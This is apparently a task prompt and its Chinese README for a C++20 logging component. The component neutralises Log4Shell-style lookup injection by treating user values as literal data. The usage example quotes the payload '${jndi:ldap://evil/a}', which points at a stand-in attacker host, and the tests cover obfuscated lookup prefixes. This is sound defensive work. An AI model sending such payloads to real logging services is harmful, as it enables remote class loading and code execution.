# 日志内容触发了远程类加载

审计服务把用户可控字符串直接交给支持查找的日志框架，攻击者写入特殊占位符让框架请求外部目录并加载类。请实现供C++20审计服务调用的可导入日志格式化组件。消息按参数化模板拼接，用户值只作为数据并按长度与控制字符限制编码；禁用任何名称查找、远程加载与表达式求值，协议前缀不触发解析。结构化字段名来自固定模式，值与键分离，输出编码稳定。用占位符注入、远程查找前缀、超长消息、控制字符、合法参数和结构化字段验证日志只记录文本。

## safelog 组件

`safelog.hpp` / `safelog.cpp` 提供注入安全的日志格式化（C++20，无第三方依赖）：

- 模板仅支持位置占位符 `{}`（`{{` / `}}` 转义字面花括号）；`{name}`、`{0}`、`${...}` 一律按字面文本复制，不触发任何名称查找、远程加载或表达式求值，`jndi:`、`ldap:` 等协议前缀不具任何含义。
- 用户值只作为数据代入，代入后不会被重新扫描；每个值按 `Limits::max_value_length` 截断，控制字符与非 ASCII 字节稳定转义为 `\n`、`\t`、`\xNN` 等形式，整行再按 `Limits::max_message_length` 截断。
- 结构化字段经 `format_fields` / `format_line` 输出为 `key="value"`，键必须匹配固定模式 `[A-Za-z_][A-Za-z0-9_.]{0,63}`，非法键替换为 `bad_key_<index>`；值始终加引号并转义，键值严格分离。

```cpp
#include "safelog.hpp"
std::string line = safelog::format_line(
    "login from {}", {"${jndi:ldap://evil/a}"},
    std::span<const safelog::Field>(fields));
// => login from ${jndi:ldap://evil/a} user="alice" ...
```

构建与测试：

```sh
cmake -S . -B build -DCMAKE_AR=/Library/Developer/CommandLineTools/usr/bin/ar \
      -DCMAKE_RANLIB=/Library/Developer/CommandLineTools/usr/bin/ranlib
cmake --build build && ctest --test-dir build --output-on-failure
```

`tests/safelog_test.cpp` 覆盖：占位符注入、远程查找前缀（含 `${lower:}` 混淆）、超长消息截断、控制字符转义、合法参数替换、结构化字段与键模式校验。
